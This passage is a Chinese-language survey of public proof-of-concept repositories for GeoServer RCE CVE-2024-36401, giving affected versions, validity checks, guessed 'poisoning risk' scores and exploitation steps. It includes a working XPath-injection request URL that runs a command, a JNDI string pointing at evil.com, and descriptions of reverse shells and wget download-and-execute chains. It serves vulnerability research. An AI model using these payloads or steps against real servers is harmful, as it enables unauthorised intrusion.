漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

